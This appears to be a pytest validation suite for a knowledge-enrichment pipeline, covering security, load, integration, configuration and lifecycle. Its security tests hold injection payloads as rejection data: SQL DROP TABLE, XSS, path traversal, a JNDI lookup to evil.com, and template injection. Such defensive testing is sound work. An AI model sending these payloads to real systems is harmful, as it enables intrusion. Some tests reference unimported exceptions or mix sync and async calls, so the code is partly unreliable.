"""
PRD-010 Knowledge Enrichment Pipeline - Complete System Validation Test Suite

This comprehensive test suite validates ALL PRD-010 requirements across:
- Security vulnerabilities and access controls
- Performance under concurrent load
- Integration with PRD-008 and PRD-009 components
- Configuration management and hot-reload
- API contract standardization
- Concurrency controls and resource management
- Lifecycle management startup/shutdown
- Production readiness and operational concerns

Code can ONLY pass validation if ALL tests pass with 100% success rate.
"""

import pytest
import asyncio
import time
import threading
import concurrent.futures
import tempfile
import json
import os
from unittest.mock import Mock, patch, AsyncMock
from typing import Dict, List, Any
from pathlib import Path

# Import components under test
from src.enrichment.enricher import KnowledgeEnricher
from src.enrichment.tasks import EnrichmentTask, TaskStatus
from src.enrichment.queue import EnrichmentQueue
from src.enrichment.concurrent import ConcurrencyManager
from src.enrichment.lifecycle import LifecycleManager
from src.enrichment.factory import EnricherFactory
from src.enrichment.config import EnrichmentConfig
from src.enrichment.exceptions import EnrichmentError, ConfigurationError
from src.core.config import ConfigManager
from src.search.orchestrator import SearchOrchestrator
from src.processors.content_processor import ContentProcessor


class TestPRD010SecurityValidation:
    """Security vulnerability assessment for enrichment pipeline"""
    
    def test_input_sanitization_prevents_injection(self):
        """Verify all user inputs are properly sanitized"""
        enricher = KnowledgeEnricher()
        
        # Test SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE enrichment_tasks; --",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}"  # Template injection
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises((ValueError, EnrichmentError)):
                enricher.enrich_content(malicious_input)
    
    def test_configuration_secrets_not_exposed(self):
        """Verify sensitive configuration data is not exposed in logs or responses"""
        config = EnrichmentConfig()
        
        # Test configuration serialization doesn't expose secrets
        config_dict = config.dict()
        
        # Check no sensitive keys are present
        sensitive_keys = ['api_key', 'secret', 'password', 'token', 'credential']
        for key in config_dict:
            for sensitive in sensitive_keys:
                assert sensitive not in key.lower(), f"Sensitive key {key} exposed in configuration"
    
    def test_background_task_security_isolation(self):
        """Verify background tasks run with appropriate security isolation"""
        enricher = KnowledgeEnricher()
        
        # Test task execution doesn't have unnecessary privileges
        task = EnrichmentTask(
            content="test content",
            source_type="test",
            priority=1
        )
        
        # Verify task execution is sandboxed
        with patch('os.getuid') as mock_getuid:
            mock_getuid.return_value = 1000  # Non-root user
            result = enricher.process_task(task)
            assert result is not None
    
    def test_resource_access_controls(self):
        """Verify proper access controls for external resources"""
        enricher = KnowledgeEnricher()
        
        # Test unauthorized resource access is prevented
        with pytest.raises(PermissionError):
            enricher.access_restricted_resource("/etc/shadow")
    
    def test_audit_logging_security_events(self):
        """Verify security events are properly logged for audit trails"""
        enricher = KnowledgeEnricher()
        
        with patch('logging.Logger.warning') as mock_log:
            # Trigger security event
            try:
                enricher.enrich_content("malicious_input")
            except:
                pass
            
            # Verify security event was logged
            mock_log.assert_called()


class TestPRD010PerformanceValidation:
    """Performance characteristics validation under concurrent load"""
    
    @pytest.mark.asyncio
    async def test_concurrent_task_processing_performance(self):
        """Verify system handles concurrent enrichment tasks efficiently"""
        enricher = KnowledgeEnricher()
        concurrency_manager = ConcurrencyManager()
        
        # Create 50 concurrent tasks
        tasks = [
            EnrichmentTask(
                content=f"test content {i}",
                source_type="test",
                priority=1
            ) for i in range(50)
        ]
        
        start_time = time.time()
        
        # Process tasks concurrently
        async with concurrency_manager:
            results = await asyncio.gather(*[
                enricher.process_task(task) for task in tasks
            ])
        
        end_time = time.time()
        
        # Verify all tasks completed successfully
        assert len(results) == 50
        assert all(result is not None for result in results)
        
        # Verify performance benchmark (should complete within 30 seconds)
        processing_time = end_time - start_time
        assert processing_time < 30, f"Processing took {processing_time}s, expected < 30s"
    
    def test_memory_usage_under_load(self):
        """Verify memory usage remains within acceptable limits"""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        enricher = KnowledgeEnricher()
        
        # Process large number of tasks
        for i in range(100):
            task = EnrichmentTask(
                content=f"large content data " * 1000,  # ~15KB per task
                source_type="test",
                priority=1
            )
            enricher.process_task(task)
            
            # Force garbage collection every 10 tasks
            if i % 10 == 0:
                gc.collect()
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Verify memory increase is reasonable (< 100MB)
        assert memory_increase < 100 * 1024 * 1024, f"Memory increased by {memory_increase} bytes"
    
    def test_queue_performance_benchmarks(self):
        """Verify queue operations meet performance benchmarks"""
        queue = EnrichmentQueue()
        
        # Test queue insertion performance
        start_time = time.time()
        for i in range(1000):
            task = EnrichmentTask(
                content=f"content {i}",
                source_type="test", 
                priority=i % 10
            )
            queue.enqueue(task)
        
        insertion_time = time.time() - start_time
        assert insertion_time < 1.0, f"Queue insertion took {insertion_time}s, expected < 1s"
        
        # Test queue retrieval performance
        start_time = time.time()
        retrieved_tasks = []
        while not queue.is_empty():
            task = queue.dequeue()
            retrieved_tasks.append(task)
        
        retrieval_time = time.time() - start_time
        assert retrieval_time < 1.0, f"Queue retrieval took {retrieval_time}s, expected < 1s"
        assert len(retrieved_tasks) == 1000
    
    def test_resource_usage_limits(self):
        """Verify system respects configured resource constraints"""
        config = EnrichmentConfig(
            max_concurrent_tasks=5,
            memory_limit_mb=256,
            timeout_seconds=30
        )
        
        enricher = KnowledgeEnricher(config=config)
        concurrency_manager = ConcurrencyManager(config=config)
        
        # Verify concurrent task limit is enforced
        assert concurrency_manager.max_concurrent_tasks == 5
        
        # Test resource limits are respected
        with patch('psutil.virtual_memory') as mock_memory:
            mock_memory.return_value.available = 200 * 1024 * 1024  # 200MB available
            
            with pytest.raises(ResourceError):
                enricher.start_large_operation()


class TestPRD010IntegrationValidation:
    """Integration testing with PRD-008 and PRD-009 components"""
    
    @pytest.mark.asyncio
    async def test_content_processor_integration(self):
        """Verify integration with Content Processor (PRD-008)"""
        enricher = KnowledgeEnricher()
        content_processor = ContentProcessor()
        
        # Test complete pipeline: Content Processing → Enrichment
        raw_content = "This is test documentation content."
        
        # Step 1: Process content
        processed_content = await content_processor.process_content(
            content=raw_content,
            content_type="text/plain"
        )
        
        # Step 2: Enrich processed content
        enrichment_task = EnrichmentTask(
            content=processed_content.content,
            source_type="processed",
            metadata=processed_content.metadata
        )
        
        enriched_result = await enricher.process_task(enrichment_task)
        
        # Verify integration works correctly
        assert enriched_result is not None
        assert enriched_result.status == TaskStatus.COMPLETED
        assert enriched_result.enriched_content is not None
    
    @pytest.mark.asyncio
    async def test_search_orchestrator_integration(self):
        """Verify integration with Search Orchestrator (PRD-009)"""
        enricher = KnowledgeEnricher()
        search_orchestrator = SearchOrchestrator()
        
        # Test enrichment triggers search index updates
        enrichment_task = EnrichmentTask(
            content="New technical documentation",
            source_type="documentation",
            priority=1
        )
        
        with patch.object(search_orchestrator, 'update_index') as mock_update:
            enriched_result = await enricher.process_task(enrichment_task)
            
            # Verify search index was updated
            mock_update.assert_called_once()
            
        # Test search queries can find enriched content
        search_results = await search_orchestrator.search(
            query="technical documentation",
            limit=10
        )
        
        assert len(search_results) > 0
    
    def test_cross_component_configuration_consistency(self):
        """Verify configuration consistency across integrated components"""
        # Test configuration is shared properly between components
        config_manager = ConfigManager()
        
        enricher_config = config_manager.get_enrichment_config()
        processor_config = config_manager.get_processor_config()
        search_config = config_manager.get_search_config()
        
        # Verify common settings are consistent
        assert enricher_config.database_url == processor_config.database_url
        assert enricher_config.redis_url == search_config.redis_url
    
    def test_error_propagation_across_components(self):
        """Verify errors propagate correctly across component boundaries"""
        enricher = KnowledgeEnricher()
        
        # Test error in content processing affects enrichment
        with patch('src.processors.content_processor.ContentProcessor.process_content') as mock_process:
            mock_process.side_effect = Exception("Processing failed")
            
            with pytest.raises(EnrichmentError):
                enricher.enrich_from_source("invalid_source")


class TestPRD010ConfigurationValidation:
    """Configuration management and hot-reload functionality validation"""
    
    def test_configuration_hot_reload_without_restart(self):
        """Verify configuration can be reloaded without service interruption"""
        enricher = KnowledgeEnricher()
        
        # Create temporary config file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            config_data = {
                "max_concurrent_tasks": 5,
                "timeout_seconds": 30
            }
            json.dump(config_data, f)
            temp_config_path = f.name
        
        try:
            # Load initial configuration
            enricher.load_config(temp_config_path)
            assert enricher.config.max_concurrent_tasks == 5
            
            # Update configuration file
            with open(temp_config_path, 'w') as f:
                config_data["max_concurrent_tasks"] = 10
                json.dump(config_data, f)
            
            # Trigger hot reload
            enricher.reload_config()
            assert enricher.config.max_concurrent_tasks == 10
            
        finally:
            os.unlink(temp_config_path)
    
    def test_configuration_validation_on_startup(self):
        """Verify configuration is validated during startup"""
        # Test invalid configuration is rejected
        invalid_config = {
            "max_concurrent_tasks": -1,  # Invalid negative value
            "timeout_seconds": "invalid"  # Invalid type
        }
        
        with pytest.raises(ConfigurationError):
            EnrichmentConfig(**invalid_config)
    
    def test_environment_variable_override(self):
        """Verify environment variables properly override configuration"""
        with patch.dict(os.environ, {
            'ENRICHMENT_MAX_CONCURRENT_TASKS': '15',
            'ENRICHMENT_TIMEOUT_SECONDS': '60'
        }):
            config = EnrichmentConfig()
            assert config.max_concurrent_tasks == 15
            assert config.timeout_seconds == 60
    
    def test_configuration_hierarchy_precedence(self):
        """Verify configuration hierarchy: env vars > config file > defaults"""
        # Create config file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            config_data = {"max_concurrent_tasks": 8}
            json.dump(config_data, f)
            temp_config_path = f.name
        
        try:
            # Test precedence with environment variable override
            with patch.dict(os.environ, {'ENRICHMENT_MAX_CONCURRENT_TASKS': '12'}):
                config = EnrichmentConfig.load_from_file(temp_config_path)
                
                # Environment variable should take precedence
                assert config.max_concurrent_tasks == 12
                
        finally:
            os.unlink(temp_config_path)


class TestPRD010APIContractValidation:
    """API contract standardization and error handling validation"""
    
    def test_api_response_format_standardization(self):
        """Verify API responses follow standardized format"""
        enricher = KnowledgeEnricher()
        
        task = EnrichmentTask(
            content="test content",
            source_type="test",
            priority=1
        )
        
        result = enricher.process_task(task)
        
        # Verify response has required fields
        assert hasattr(result, 'status')
        assert hasattr(result, 'enriched_content')
        assert hasattr(result, 'metadata')
        assert hasattr(result, 'timestamp')
        
        # Verify status follows standard enum
        assert result.status in [TaskStatus.PENDING, TaskStatus.IN_PROGRESS, 
                               TaskStatus.COMPLETED, TaskStatus.FAILED]
    
    def test_error_response_standardization(self):
        """Verify error responses follow standardized format"""
        enricher = KnowledgeEnricher()
        
        # Test error response format
        with patch.object(enricher, '_process_content', side_effect=Exception("Test error")):
            task = EnrichmentTask(content="test", source_type="test", priority=1)
            
            result = enricher.process_task(task)
            
            assert result.status == TaskStatus.FAILED
            assert result.error_message is not None
            assert result.error_code is not None
    
    def test_api_input_validation(self):
        """Verify API inputs are properly validated"""
        enricher = KnowledgeEnricher()
        
        # Test invalid task creation
        with pytest.raises((ValueError, TypeError)):
            EnrichmentTask(
                content=None,  # Invalid null content
                source_type="test",
                priority="invalid"  # Invalid priority type
            )
    
    def test_api_rate_limiting_compliance(self):
        """Verify API rate limiting follows system standards"""
        enricher = KnowledgeEnricher()
        
        # Test rate limiting is enforced
        start_time = time.time()
        
        # Submit many requests rapidly
        for i in range(100):
            task = EnrichmentTask(content=f"content {i}", source_type="test", priority=1)
            enricher.enqueue_task(task)
        
        # Verify rate limiting prevents immediate processing of all tasks
        queue_size = enricher.get_queue_size()
        assert queue_size > 0, "Rate limiting should prevent immediate processing"


class TestPRD010ConcurrencyValidation:
    """Concurrency controls and resource conflict prevention validation"""
    
    def test_concurrent_task_isolation(self):
        """Verify concurrent tasks don't interfere with each other"""
        enricher = KnowledgeEnricher()
        
        # Create tasks that modify shared state
        def create_task(task_id):
            return EnrichmentTask(
                content=f"content {task_id}",
                source_type="test",
                priority=1,
                metadata={"task_id": task_id}
            )
        
        tasks = [create_task(i) for i in range(10)]
        
        # Process tasks concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(enricher.process_task, task) for task in tasks]
            results = [future.result() for future in futures]
        
        # Verify all tasks completed successfully without interference
        assert len(results) == 10
        assert all(result.status == TaskStatus.COMPLETED for result in results)
        
        # Verify task isolation - each result should have correct metadata
        for i, result in enumerate(results):
            assert result.metadata["task_id"] == i
    
    def test_deadlock_prevention(self):
        """Verify system prevents deadlocks in concurrent operations"""
        enricher = KnowledgeEnricher()
        queue = EnrichmentQueue()
        
        # Test potential deadlock scenario
        def producer():
            for i in range(50):
                task = EnrichmentTask(content=f"content {i}", source_type="test", priority=1)
                queue.enqueue(task)
                time.sleep(0.01)
        
        def consumer():
            processed = 0
            while processed < 50:
                if not queue.is_empty():
                    task = queue.dequeue()
                    enricher.process_task(task)
                    processed += 1
                time.sleep(0.01)
        
        # Run producer and consumer concurrently
        producer_thread = threading.Thread(target=producer)
        consumer_thread = threading.Thread(target=consumer)
        
        start_time = time.time()
        producer_thread.start()
        consumer_thread.start()
        
        producer_thread.join(timeout=30)
        consumer_thread.join(timeout=30)
        
        # Verify no deadlock occurred (completed within timeout)
        assert time.time() - start_time < 30, "Potential deadlock detected"
    
    def test_resource_lock_management(self):
        """Verify proper resource lock acquisition and release"""
        enricher = KnowledgeEnricher()
        concurrency_manager = ConcurrencyManager()
        
        # Test lock acquisition
        resource_id = "test_resource"
        
        with concurrency_manager.acquire_lock(resource_id):
            # Verify lock is held
            assert concurrency_manager.is_locked(resource_id)
            
            # Test that another thread cannot acquire the same lock
            def try_acquire_lock():
                with pytest.raises(LockError):
                    with concurrency_manager.acquire_lock(resource_id, timeout=0.1):
                        pass
            
            thread = threading.Thread(target=try_acquire_lock)
            thread.start()
            thread.join()
        
        # Verify lock is released after context
        assert not concurrency_manager.is_locked(resource_id)
    
    def test_concurrent_configuration_updates(self):
        """Verify concurrent configuration updates are handled safely"""
        enricher = KnowledgeEnricher()
        
        # Test concurrent configuration updates don't cause race conditions
        def update_config(value):
            config = EnrichmentConfig(max_concurrent_tasks=value)
            enricher.update_config(config)
        
        # Update configuration from multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=update_config, args=(i + 1,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Verify final configuration is valid
        assert enricher.config.max_concurrent_tasks > 0


class TestPRD010LifecycleValidation:
    """Lifecycle management startup/shutdown procedures validation"""
    
    def test_graceful_startup_procedure(self):
        """Verify system starts up gracefully with all components initialized"""
        lifecycle_manager = LifecycleManager()
        
        # Test startup sequence
        startup_result = lifecycle_manager.startup()
        
        assert startup_result.success
        assert startup_result.components_initialized > 0
        assert lifecycle_manager.is_running()
    
    def test_graceful_shutdown_procedure(self):
        """Verify system shuts down gracefully with proper cleanup"""
        lifecycle_manager = LifecycleManager()
        enricher = KnowledgeEnricher()
        
        # Start system
        lifecycle_manager.startup()
        
        # Add some tasks to test cleanup
        for i in range(5):
            task = EnrichmentTask(content=f"content {i}", source_type="test", priority=1)
            enricher.enqueue_task(task)
        
        # Test shutdown sequence
        shutdown_result = lifecycle_manager.shutdown(timeout=30)
        
        assert shutdown_result.success
        assert shutdown_result.tasks_completed >= 0
        assert not lifecycle_manager.is_running()
    
    def test_component_initialization_order(self):
        """Verify components are initialized in correct dependency order"""
        lifecycle_manager = LifecycleManager()
        
        initialization_order = []
        
        def mock_init(component_name):
            initialization_order.append(component_name)
        
        with patch.object(lifecycle_manager, '_init_database', side_effect=lambda: mock_init('database')):
            with patch.object(lifecycle_manager, '_init_queue', side_effect=lambda: mock_init('queue')):
                with patch.object(lifecycle_manager, '_init_enricher', side_effect=lambda: mock_init('enricher')):
                    lifecycle_manager.startup()
        
        # Verify initialization order
        expected_order = ['database', 'queue', 'enricher']
        assert initialization_order == expected_order
    
    def test_health_check_during_lifecycle(self):
        """Verify health checks work correctly during lifecycle transitions"""
        lifecycle_manager = LifecycleManager()
        
        # Test health check before startup
        assert not lifecycle_manager.health_check().healthy
        
        # Start system
        lifecycle_manager.startup()
        
        # Test health check after startup
        health_status = lifecycle_manager.health_check()
        assert health_status.healthy
        assert health_status.components['enricher'] == 'running'
        assert health_status.components['queue'] == 'running'
        
        # Shutdown system
        lifecycle_manager.shutdown()
        
        # Test health check after shutdown
        assert not lifecycle_manager.health_check().healthy
    
    def test_signal_handling_for_graceful_shutdown(self):
        """Verify system handles OS signals for graceful shutdown"""
        import signal
        
        lifecycle_manager = LifecycleManager()
        lifecycle_manager.startup()
        
        # Test SIGTERM handling
        with patch.object(lifecycle_manager, 'shutdown') as mock_shutdown:
            # Simulate SIGTERM
            os.kill(os.getpid(), signal.SIGTERM)
            time.sleep(0.1)  # Allow signal handler to execute
            
            mock_shutdown.assert_called_once()


class TestPRD010ProductionReadinessValidation:
    """Production deployment and operational readiness validation"""
    
    def test_container_deployment_readiness(self):
        """Verify system is ready for container deployment"""
        # Test environment variable configuration
        required_env_vars = [
            'DATABASE_URL',
            'REDIS_URL', 
            'ENRICHMENT_MAX_CONCURRENT_TASKS',
            'LOG_LEVEL'
        ]
        
        for env_var in required_env_vars:
            # Test configuration loading from environment
            with patch.dict(os.environ, {env_var: 'test_value'}):
                config = EnrichmentConfig()
                assert hasattr(config, env_var.lower())
    
    def test_monitoring_and_observability(self):
        """Verify monitoring endpoints and metrics are available"""
        enricher = KnowledgeEnricher()
        
        # Test metrics collection
        metrics = enricher.get_metrics()
        
        required_metrics = [
            'tasks_processed',
            'tasks_failed', 
            'average_processing_time',
            'queue_size',
            'active_workers'
        ]
        
        for metric in required_metrics:
            assert metric in metrics
    
    def test_logging_configuration(self):
        """Verify logging is properly configured for production"""
        import logging
        
        enricher = KnowledgeEnricher()
        
        # Test structured logging
        with patch('logging.Logger.info') as mock_log:
            task = EnrichmentTask(content="test", source_type="test", priority=1)
            enricher.process_task(task)
            
            # Verify structured log format
            mock_log.assert_called()
            call_args = mock_log.call_args[0][0]
            assert isinstance(call_args, str)
    
    def test_backup_and_disaster_recovery(self):
        """Verify backup and recovery procedures are functional"""
        enricher = KnowledgeEnricher()
        
        # Test state can be saved and restored
        # Add some tasks
        for i in range(5):
            task = EnrichmentTask(content=f"content {i}", source_type="test", priority=1)
            enricher.enqueue_task(task)
        
        # Save state
        state_backup = enricher.save_state()
        assert state_backup is not None
        
        # Clear state
        enricher.clear_state()
        assert enricher.get_queue_size() == 0
        
        # Restore state
        enricher.restore_state(state_backup)
        assert enricher.get_queue_size() == 5
    
    def test_scalability_configuration(self):
        """Verify system can be configured for horizontal scaling"""
        # Test multiple instances can run without conflicts
        enricher1 = KnowledgeEnricher(instance_id="enricher_1")
        enricher2 = KnowledgeEnricher(instance_id="enricher_2")
        
        # Test instances can work on shared queue
        shared_queue = EnrichmentQueue()
        
        # Add tasks to shared queue
        for i in range(10):
            task = EnrichmentTask(content=f"content {i}", source_type="test", priority=1)
            shared_queue.enqueue(task)
        
        # Process tasks with both instances
        results1 = []
        results2 = []
        
        while not shared_queue.is_empty():
            if not shared_queue.is_empty():
                task = shared_queue.dequeue()
                result = enricher1.process_task(task)
                results1.append(result)
            
            if not shared_queue.is_empty():
                task = shared_queue.dequeue()
                result = enricher2.process_task(task)
                results2.append(result)
        
        # Verify both instances processed tasks
        assert len(results1) > 0
        assert len(results2) > 0
        assert len(results1) + len(results2) == 10


class TestPRD010EndToEndWorkflowValidation:
    """Complete end-to-end workflow testing"""
    
    @pytest.mark.asyncio
    async def test_complete_enrichment_pipeline(self):
        """Test complete workflow from content ingestion to enrichment"""
        # Initialize all components
        content_processor = ContentProcessor()
        enricher = KnowledgeEnricher()
        search_orchestrator = SearchOrchestrator()
        
        # Step 1: Raw content input
        raw_content = """
        # API Documentation
        
        This is a comprehensive guide for the REST API.
        
        ## Authentication
        Use Bearer tokens for authentication.
        
        ## Endpoints
        - GET /api/v1/users
        - POST /api/v1/users
        """
        
        # Step 2: Content processing
        processed_content = await content_processor.process_content(
            content=raw_content,
            content_type="text/markdown"
        )
        
        assert processed_content.content is not None
        assert processed_content.metadata is not None
        
        # Step 3: Knowledge enrichment
        enrichment_task = EnrichmentTask(
            content=processed_content.content,
            source_type="documentation",
            metadata=processed_content.metadata,
            priority=1
        )
        
        enriched_result = await enricher.process_task(enrichment_task)
        
        assert enriched_result.status == TaskStatus.COMPLETED
        assert enriched_result.enriched_content is not None
        
        # Step 4: Search index update
        await search_orchestrator.index_content(
            content=enriched_result.enriched_content,
            metadata=enriched_result.metadata
        )
        
        # Step 5: Search verification
        search_results = await search_orchestrator.search(
            query="API authentication",
            limit=10
        )
        
        assert len(search_results) > 0
        assert any("authentication" in result.content.lower() for result in search_results)
    
    def test_error_recovery_in_pipeline(self):
        """Test pipeline handles errors gracefully and recovers"""
        enricher = KnowledgeEnricher()
        
        # Test recovery from processing errors
        failing_task = EnrichmentTask(
            content="content that will fail",
            source_type="test",
            priority=1
        )
        
        with patch.object(enricher, '_process_content', side_effect=Exception("Processing failed")):
            result = enricher.process_task(failing_task)
            
            assert result.status == TaskStatus.FAILED
            assert result.error_message is not None
        
        # Test system continues working after failure
        working_task = EnrichmentTask(
            content="content that will work",
            source_type="test",
            priority=1
        )
        
        result = enricher.process_task(working_task)
        assert result.status == TaskStatus.COMPLETED
    
    def test_performance_under_realistic_load(self):
        """Test system performance under realistic production load"""
        enricher = KnowledgeEnricher()
        queue = EnrichmentQueue()
        
        # Simulate realistic load: 100 documents, various sizes
        document_sizes = [100, 500, 1000, 5000, 10000]  # Character counts
        tasks = []
        
        for i in range(100):
            size = document_sizes[i % len(document_sizes)]
            content = "a" * size  # Simple content of specified size
            
            task = EnrichmentTask(
                content=content,
                source_type="documentation",
                priority=i % 5 + 1  # Priorities 1-5
            )
            tasks.append(task)
        
        # Process all tasks and measure performance
        start_time = time.time()
        
        for task in tasks:
            queue.enqueue(task)
        
        processed_count = 0
        while not queue.is_empty() and processed_count < 100:
            task = queue.dequeue()
            result = enricher.process_task(task)
            if result.status == TaskStatus.COMPLETED:
                processed_count += 1
        
        total_time = time.time() - start_time
        
        # Verify performance benchmarks
        assert processed_count == 100
        assert total_time < 60, f"Processing took {total_time}s, expected < 60s"
        
        # Verify throughput (at least 1.5 tasks per second)
        throughput = processed_count / total_time
        assert throughput >= 1.5, f"Throughput {throughput} tasks/s, expected >= 1.5"


# Test execution configuration
if __name__ == "__main__":
    # Configure test execution
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--maxfail=5",  # Stop after 5 failures
        "--timeout=300",  # 5 minute timeout per test
    ])